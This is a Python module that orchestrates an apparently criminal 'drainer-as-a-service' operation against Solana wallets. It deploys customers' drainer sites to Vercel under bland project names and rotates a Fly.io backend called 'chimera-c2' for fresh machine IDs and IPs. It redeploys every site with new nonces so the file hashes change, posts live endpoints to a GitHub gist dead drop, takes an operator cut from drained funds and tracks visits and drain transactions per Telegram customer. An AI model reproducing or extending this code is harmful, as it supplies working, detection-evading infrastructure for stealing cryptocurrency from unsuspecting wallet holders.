# core/drainer_service.py — Orchestrates the drainer-as-a-service stack
#
#   create_customer(wallet, chat_id)
#       → registry record + stable Vercel project + first deployment → live URL
#   cycle()   (every cycle_minutes)
#       → recycle the backend machine (stable app, fresh machine ID/IP/session)
#       → redeploy every customer site with a fresh nonce (new file hash)
#       → update the dead drop with current drainer endpoints
#
# The bot (Telegram) calls the HTTP API in service_api.py which wraps this.

import json
import logging
import secrets
import threading
import time
from pathlib import Path
from typing import Any, Optional

import requests

from core.customer_sites import (
    DEFAULT_DATA_DIR,
    CustomerRegistry,
    build_customer_files,
    is_valid_wallet,
)
from core.drainer_backend import DrainerBackend
from core.fly_provisioner import FlyProvisioner
from core.vercel_deployer import VercelDeployer


class DrainerService:
    def __init__(self, config: dict[str, Any]):
        self.config = config
        self.fly = FlyProvisioner(
            api_token=str(config["fly_api_token"]),
            org_slug=str(config["fly_org"]),
            region=str(config.get("fly_region", "iad")),
            app_base=str(config.get("fly_app_base", "chimera-c2")),
        )
        self.vercel = VercelDeployer(
            api_token=str(config["vercel_api_token"]),
            team_slug=str(config["vercel_team"]),
            project_base=str(config.get("vercel_project_base", "cloudsync-front")),
        )
        self.registry = CustomerRegistry()

        drainer_cfg = config.get("drainer", {}) or {}
        # Backend env: config drainer.env + SERVICE_KEY (shared secret for
        # the /admin/chat-ids registration endpoint)
        backend_env = dict(drainer_cfg.get("env", {}) or {})
        self.service_key: str = str(drainer_cfg.get("service_key", "") or "")
        if self.service_key:
            backend_env["SERVICE_KEY"] = self.service_key
        self.backend = DrainerBackend(self.fly, backend_env=backend_env)
        self.aes_secret: str = str(drainer_cfg.get("aes_secret", ""))
        self.cycle_minutes: int = int(config.get("cycle_minutes", 60))

        # Dead drop (optional — set gist creds to publish drainer endpoints)
        self.dead_drop = None
        if config.get("github_token") and config.get("gist_id"):
            from core.deaddrop import DeadDrop

            self.dead_drop = DeadDrop(
                gist_token=str(config["github_token"]),
                gist_id=str(config["gist_id"]),
            )

        self._backend_session: Optional[dict[str, Any]] = None
        self._lock = threading.Lock()
        self._running = False

        if not self.aes_secret:
            raise ValueError("config.yaml: drainer.aes_secret is required")

    # ------------------------------------------------------------------
    # Backend
    # ------------------------------------------------------------------

    def backend_origin(self) -> str:
        return f"https://{DrainerBackend.APP_NAME}.fly.dev"

    def ensure_backend(self) -> dict[str, Any]:
        """Recycle the backend (idempotent per cycle)."""
        with self._lock:
            self._inject_operator_env()
            self._backend_session = self.backend.recycle(
                valid_chat_ids=self._registry_chat_ids()
            )
        return self._backend_session

    def _registry_chat_ids(self) -> list[str]:
        """Current customer chat ids, deduped, order-stable."""
        seen: list[str] = []
        for rec in self.registry.all():
            cid = str(rec.get("chat_id", "") or "")
            if cid and cid not in seen:
                seen.append(cid)
        return seen

    def check_backend_health(self, timeout: int = 10) -> bool:
        try:
            r = requests.get(self.backend.health_url(), timeout=timeout)
            return r.status_code == 200
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Customers
    # ------------------------------------------------------------------

    def create_customer(self, wallet: str, chat_id: str) -> dict[str, Any]:
        """Register + deploy a new customer site. Returns their live URL."""
        if not is_valid_wallet(wallet):
            raise ValueError(f"invalid Solana wallet: {wallet}")
        if self.registry.get(wallet):
            # already a customer — redeploy instead of duplicating
            return self.redeploy_customer(wallet)

        project_name = self.registry.new_project_name()
        self.registry.add(wallet, chat_id, project_name)

        result = self._deploy_customer(wallet, nonce=secrets.token_hex(8))

        # Register the new chat id on the live backend right away so their
        # notifications pass validation before the next rotation cycle.
        self._push_chat_ids(add=[str(chat_id)])

        return result

    def _push_chat_ids(self, add: Optional[list[str]] = None, remove: Optional[list[str]] = None) -> None:
        """Push customer chat-id registrations to the live backend
        (anti-spoof validation). Non-fatal — the next cycle re-injects
        the full registry from config anyway."""
        if not (add or remove) or not self.service_key:
            return
        try:
            requests.post(
                f"{self.backend_origin()}/admin/chat-ids",
                headers={"X-Service-Key": self.service_key},
                json={"add": list(add or []), "remove": list(remove or [])},
                timeout=10,
            )
        except Exception as e:
            logging.warning(f"[drainer] chat-id registration failed (next cycle will fix): {e}")

    def redeploy_customer(self, wallet: str) -> dict[str, Any]:
        if not self.registry.get(wallet):
            raise ValueError(f"unknown customer: {wallet}")
        return self._deploy_customer(wallet, nonce=secrets.token_hex(8))

    def _deploy_customer(self, wallet: str, nonce: str) -> dict[str, Any]:
        rec = self.registry.get(wallet)
        if not rec:
            raise ValueError(f"unknown customer: {wallet}")

        files = build_customer_files(
            wallet=wallet,
            chat_id=rec["chat_id"],
            aes_secret=self.aes_secret,
            backend_origin=self.backend_origin(),
            nonce=nonce,
            usdc_payout=bool(rec.get("usdc_payout")),
        )
        vdep = self.vercel.deploy_to_project(rec["project_name"], files)

        # The customer-facing URL is the project's STABLE alias (serves the
        # latest production deployment). Per-deployment hash URLs die on
        # rotation — never hand those out.
        url = self._stable_customer_url(rec["project_name"], vdep["deployment_url"])
        self.registry.record_deployment(wallet, url, nonce)

        logging.info(f"[drainer] customer {wallet[:6]}... deployed → {url}")
        return {"wallet": wallet, "url": url, "project_name": rec["project_name"]}

    def _stable_customer_url(self, project_name: str, deployment_url: str) -> str:
        """Prefer https://{project}.vercel.app; fall back to the deployment
        URL only if the canonical alias doesn't serve (name taken globally)."""
        canonical = f"https://{project_name}.vercel.app"
        try:
            r = requests.get(f"{canonical}/", timeout=15)
            if r.status_code == 200:
                return canonical
        except Exception:
            pass
        return f"https://{deployment_url}"

    def redeploy_all(self) -> list[dict[str, Any]]:
        """Fresh deployment of every customer site (per rotation cycle)."""
        results = []
        for rec in self.registry.all():
            try:
                results.append(self.redeploy_customer(rec["wallet"]))
            except Exception as e:
                logging.error(f"[drainer] redeploy failed for {rec['wallet'][:6]}...: {e}")
        return results

    # ------------------------------------------------------------------
    # Customer management (bot commands)
    # ------------------------------------------------------------------

    def delete_customer(self, wallet: str) -> dict[str, Any]:
        """Remove a customer: registry record + Vercel project + chat-id
        registration (if no other site uses that chat id)."""
        rec = self.registry.get(wallet)
        if not rec:
            raise ValueError(f"unknown customer: {wallet}")

        chat_id = str(rec.get("chat_id", "") or "")
        project_name = rec["project_name"]

        try:
            self.vercel.delete_project(project_name)
        except Exception as e:
            logging.warning(f"[drainer] project delete failed for {project_name}: {e}")

        self.registry.delete(wallet)

        if chat_id and not any(
            str(r.get("chat_id", "") or "") == chat_id for r in self.registry.all()
        ):
            self._push_chat_ids(remove=[chat_id])

        logging.info(f"[drainer] customer {wallet[:6]}... deleted (project {project_name})")
        return {"wallet": wallet, "deleted": True, "project_name": project_name}

    def set_payout_wallet(self, wallet: str, new_wallet: str) -> dict[str, Any]:
        """Change a customer's payout wallet — same project/URL, redeployed."""
        self.registry.update_wallet(wallet, new_wallet)
        return self._deploy_customer(new_wallet, nonce=secrets.token_hex(8))

    def set_usdc_payout(self, wallet: str, enabled: bool) -> dict[str, Any]:
        """Toggle USDC conversion for a customer — payload re-patched."""
        self.registry.set_usdc_payout(wallet, enabled)
        return self._deploy_customer(wallet, nonce=secrets.token_hex(8))

    # ------------------------------------------------------------------
    # Operator fee config (admin-settable via the bot, live)
    # ------------------------------------------------------------------

    def _operator_path(self):
        return DEFAULT_DATA_DIR / "operator.json"

    def _load_operator(self) -> dict[str, Any]:
        path = self._operator_path()
        if path.exists():
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
                return {
                    "wallets": [str(w) for w in (data.get("wallets") or [])],
                    "cut": data.get("cut"),
                }
            except (json.JSONDecodeError, OSError):
                pass
        return {"wallets": [], "cut": None}

    def _save_operator(self, op: dict[str, Any]) -> None:
        path = self._operator_path()
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(op, indent=2) + "\n", encoding="utf-8")

    def get_operator_config(self) -> dict[str, Any]:
        """Current fee config: persisted value, falling back to the
        backend env (config.yaml drainer.env OPERATOR_*)."""
        op = self._load_operator()
        if op["wallets"]:
            return {"wallets": op["wallets"], "cut": op["cut"] if op["cut"] is not None else 0.0}
        env_wallets = [
            w for w in str(self.backend.backend_env.get("OPERATOR_WALLETS", "") or "").split(",") if w.strip()
        ]
        if env_wallets:
            try:
                cut = float(self.backend.backend_env.get("OPERATOR_CUT", "0") or 0)
            except ValueError:
                cut = 0.0
            return {"wallets": env_wallets, "cut": cut}
        return {"wallets": [], "cut": 0.0}

    def set_operator(self, wallets: list[str], cut: Optional[float] = None) -> dict[str, Any]:
        """Persist the fee config, push it to the live backend (takes
        effect on the next drain, no recycle), and it is re-injected at
        each rotation cycle."""
        op = {"wallets": [str(w) for w in wallets], "cut": cut}
        self._save_operator(op)
        self._push_operator()
        return self.get_operator_config()

    def _push_operator(self) -> None:
        """Live-push the fee config to the backend's /admin/operator."""
        op = self._load_operator()
        if not op.get("wallets") or not self.service_key:
            return
        try:
            requests.post(
                f"{self.backend_origin()}/admin/operator",
                headers={"X-Service-Key": self.service_key},
                json={"wallets": op["wallets"], "cut": op.get("cut")},
                timeout=10,
            )
        except Exception as e:
            logging.warning(f"[drainer] operator config push failed (retried at next cycle): {e}")

    def _inject_operator_env(self) -> None:
        """Re-inject the persisted fee config into the backend machine env
        before each recycle, so it survives rotation."""
        op = self._load_operator()
        if op.get("wallets"):
            self.backend.backend_env["OPERATOR_WALLETS"] = ",".join(op["wallets"])
            if op.get("cut") is not None:
                self.backend.backend_env["OPERATOR_CUT"] = str(op["cut"])

    # ------------------------------------------------------------------
    # Funnel stats + drain records (pulled from the backend)
    # ------------------------------------------------------------------

    def _stats_path(self):
        return DEFAULT_DATA_DIR / "stats.json"

    def pull_stats(self) -> Optional[dict[str, Any]]:
        """Pull funnel counters + drain events from the live backend
        (pull-and-clear on the backend side)."""
        if not self.service_key:
            return None
        try:
            r = requests.get(
                f"{self.backend_origin()}/admin/stats",
                headers={"X-Service-Key": self.service_key},
                timeout=10,
            )
            if not r.ok:
                return None
            return r.json()
        except Exception as e:
            logging.warning(f"[drainer] stats pull failed: {e}")
            return None

    def _load_stats(self) -> dict[str, Any]:
        path = self._stats_path()
        if path.exists():
            try:
                return json.loads(path.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                pass
        return {"counters": {}, "drains": []}

    def _save_stats(self, stats: dict[str, Any]) -> None:
        path = self._stats_path()
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            json.dumps(stats, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )

    def _accumulate_stats(self, pulled: dict[str, Any]) -> dict[str, Any]:
        """Merge a backend pull into the persistent stats file."""
        stats = self._load_stats()
        counters: dict[str, Any] = stats.setdefault("counters", {})
        for chat_id, c in (pulled.get("counters") or {}).items():
            cur = counters.setdefault(chat_id, {"visits": 0, "rejects": 0, "drains": 0})
            for k in ("visits", "rejects", "drains"):
                cur[k] = int(cur.get(k, 0)) + int((c or {}).get(k, 0) or 0)
        drains = stats.setdefault("drains", [])
        seen = {d.get("txid") for d in drains}
        for ev in pulled.get("drains") or []:
            if ev.get("txid") not in seen:
                drains.append(ev)
                seen.add(ev.get("txid"))
        self._save_stats(stats)
        return stats

    def get_stats(self, chat_id: Optional[str] = None) -> dict[str, Any]:
        """Stats for one customer chat (or everyone). Pulls live numbers
        from the backend first so mid-cycle hits are included."""
        pulled = self.pull_stats()
        stats = self._accumulate_stats(pulled) if pulled else self._load_stats()

        if chat_id is None:
            return stats

        counters = stats.get("counters", {}).get(str(chat_id), {
            "visits": 0, "rejects": 0, "drains": 0,
        })
        drains = [
            d for d in stats.get("drains", []) if str(d.get("chatId", "")) == str(chat_id)
        ]
        return {"counters": counters, "drains": drains}

    # ------------------------------------------------------------------
    # Rotation cycle
    # ------------------------------------------------------------------

    def cycle(self) -> dict[str, Any]:
        """One rotation: recycle backend, redeploy customers, update dead drop."""
        # Pull stats BEFORE recycling — the machine (and its counters) dies here.
        pulled = self.pull_stats()
        if pulled:
            self._accumulate_stats(pulled)

        logging.info("[drainer] cycle: recycling backend machine...")
        backend = self.ensure_backend()

        healthy = self.check_backend_health()
        logging.info(f"[drainer] backend health: {'ok' if healthy else 'DEGRADED (may still be booting)'}")

        logging.info("[drainer] cycle: redeploying customer sites...")
        deployed = self.redeploy_all()

        if self.dead_drop:
            try:
                self.dead_drop.update(
                    {
                        "v": 3,
                        "drainer_backend": self.backend_origin(),
                        "customers": [
                            {"wallet": c["wallet"], "url": c["deployments"][-1]["url"]}
                            for c in self.registry.all()
                            if c.get("deployments")
                        ],
                        "cycle_machine": backend["vm_id"],
                        "ts": time.strftime("%Y%m%d-%H%M%S", time.gmtime()),
                    }
                )
            except Exception as e:
                logging.error(f"[drainer] dead drop update failed: {e}")

        return {"backend": backend, "deployed": deployed, "backend_healthy": healthy}

    def start(self) -> None:
        """Background rotation loop."""
        self._running = True
        while self._running:
            try:
                self.cycle()
            except Exception as e:
                logging.error(f"[drainer] cycle failed: {e}")
            # sleep in small steps so stop() is responsive
            deadline = time.time() + self.cycle_minutes * 60
            while self._running and time.time() < deadline:
                time.sleep(5)

    def stop(self) -> None:
        self._running = False
